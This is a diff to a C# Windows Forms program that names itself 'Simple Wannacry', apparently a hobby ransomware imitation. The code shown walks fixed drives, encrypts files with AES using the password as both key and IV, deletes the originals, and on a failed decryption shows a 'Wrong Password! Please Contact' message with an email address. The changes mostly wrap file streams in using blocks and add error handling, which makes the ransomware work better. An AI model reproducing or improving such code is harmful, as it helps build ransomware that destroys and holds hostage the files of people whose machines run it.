@@ -14,6 +14,7 @@ namespace WannaCry
         public Form1()
         {
             InitializeComponent();
+            this.Text = "Simple Wannacry";
             foreach (var item in DriveInfo.GetDrives())
             {
                 if(item.DriveType == DriveType.Fixed)
@@ -58,6 +59,7 @@ namespace WannaCry
         private void button2_Click(object sender, EventArgs e)
         {
             decryptPass = textBox1.Text;
+            bool showDecryptMessage = true;
             if (comboBox1.SelectedItem == null)
             {
                 MessageBox.Show("Not choosing drive!");
@@ -79,13 +81,18 @@ namespace WannaCry
                                 File.Delete(file.FullName);
                         }
                     }
+                    catch (ArgumentException argex)
+                    {
+                        showDecryptMessage = false;
+                    }
                     catch
                     {
                         continue;
                     }
                 }
 
-                MessageBox.Show("Decrypt Success");
+                if(showDecryptMessage)
+                    MessageBox.Show("Decrypt Success");
             }
         }
 
@@ -106,19 +113,21 @@ namespace WannaCry
             {
                 string password = $@"{decryptPass}";
                 byte[] key = new UnicodeEncoding().GetBytes(password);
-                
-                FileStream fsCrypt = new FileStream(outputFile, FileMode.Create);
-                RijndaelManaged RMCrypto = new RijndaelManaged();
-                CryptoStream cs = new CryptoStream(fsCrypt,RMCrypto.CreateEncryptor(key, key),CryptoStreamMode.Write);
-                FileStream fsIn = new FileStream(inputFile, FileMode.Open);
 
-                int data;
-                while ((data = fsIn.ReadByte()) != -1)
-                    cs.WriteByte((byte)data);
+                using (FileStream fsCrypt = new FileStream(outputFile, FileMode.Create))
+                {
+                    RijndaelManaged RMCrypto = new RijndaelManaged();
+                    CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateEncryptor(key, key), CryptoStreamMode.Write);
+                    FileStream fsIn = new FileStream(inputFile, FileMode.Open);
 
-                fsIn.Close();
-                cs.Close();
-                fsCrypt.Close();
+                    int data;
+                    while ((data = fsIn.ReadByte()) != -1)
+                        cs.WriteByte((byte)data);
+
+                    fsIn.Close();
+                    cs.Close();
+                    fsCrypt.Close();
+                }
             }
             catch
             {
@@ -135,25 +144,27 @@ namespace WannaCry
                 UnicodeEncoding UE = new UnicodeEncoding();
                 byte[] key = UE.GetBytes(password);
 
-                FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
+                using (FileStream fsCrypt = new FileStream(inputFile, FileMode.Open))
+                {
+                    RijndaelManaged RMCrypto = new RijndaelManaged();
 
-                RijndaelManaged RMCrypto = new RijndaelManaged();
+                    CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, key), CryptoStreamMode.Read);
 
-                CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, key),CryptoStreamMode.Read);
+                    FileStream fsOut = new FileStream(outputFile, FileMode.Create);
 
-                FileStream fsOut = new FileStream(outputFile, FileMode.Create);
+                    int data;
+                    while ((data = cs.ReadByte()) != -1)
+                        fsOut.WriteByte((byte)data);
 
-                int data;
-                while ((data = cs.ReadByte()) != -1)
-                    fsOut.WriteByte((byte)data);
-
-                fsOut.Close();
-                cs.Close();
-                fsCrypt.Close();
+                    fsOut.Close();
+                    cs.Close();
+                    fsCrypt.Close();
+                } 
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 MessageBox.Show("Wrong Password! \n Please Contact bhdryrdm@gmail.com");
+                throw new ArgumentException();
             }
         }
 
